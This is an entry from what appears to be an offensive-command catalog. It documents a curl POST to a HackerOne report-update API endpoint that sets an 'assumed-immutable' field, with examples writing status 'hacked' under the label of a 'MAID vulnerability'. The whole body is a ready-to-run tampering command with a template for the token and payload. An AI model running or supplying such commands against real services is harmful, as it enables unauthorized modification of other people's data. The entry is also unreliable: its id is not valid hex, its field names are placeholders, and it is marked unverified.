---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
data: >-
  curl -X POST 'https://hackerone.com/reports/813300/update' -H 'Authorization:
  Bearer YOUR_TOKEN' -H 'Content-Type: application/json' -d '{"immutable_field":
  "modified_value"}'
tags:
  - web
  - api
  - modification
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:25:53.173Z'
verified: false
validated: true
submitted: true
---
# curl-modify-data

## Command

```bash
curl -X POST 'https://hackerone.com/reports/813300/update' \
  -H 'Authorization: Bearer YOUR_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"immutable_field": "modified_value"}'
```

## Description

This command uses curl to send a POST request to modify an assumed-immutable field on the HackerOne platform via its API, exploiting the MAID vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `URL` | Target endpoint for update | Yes |
| `-H 'Authorization: Bearer YOUR_TOKEN'` | Authentication header with API token | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON payload type | Yes |
| `-d` | JSON data with modified field | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://hackerone.com/reports/813300/update' \
  -H 'Authorization: Bearer YOUR_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"status": "hacked"}'
```

### Advanced Usage

```bash
curl -X POST 'https://hackerone.com/reports/813300/update' \
  -H 'Authorization: Bearer YOUR_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"status": "hacked", "notes": "Modified via MAID"}'
```

## Expected Output

A JSON response like {"success": true, "updated": {"status": "hacked"}}, indicating the modification was accepted without validation errors.

## Related

- [[Related Procedure: Exploit-Modification-of-Assumed-Immutable-Data]]
